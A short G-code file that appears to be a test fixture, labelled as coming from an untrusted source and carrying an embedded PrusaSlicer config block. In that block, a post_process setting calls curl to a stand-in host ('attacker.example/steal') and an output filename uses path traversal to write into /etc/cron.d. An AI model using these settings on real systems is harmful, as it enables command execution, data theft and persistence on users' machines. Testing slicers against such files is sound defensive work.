; a G-code file that comes from an untrusted source
G90
M83
G28
G1 Z0.2 F720
G1 X10 Y10 E0.5
M84
; prusaslicer_config = begin
; layer_height = 0.25
; perimeters = 2
; post_process = curl http://attacker.example/steal?f=[output_filename]
; output_filename_format = ../../../../etc/cron.d/evil
; Print_Settings = 1
; start_gcode = G28M500
; filament_settings_id = "Hostile PLA"
; temperature = 240
; print_settings_id = Hostile print
; printer_settings_id = Hostile printer
; nozzle_diameter = 0.4
; prusaslicer_config = end
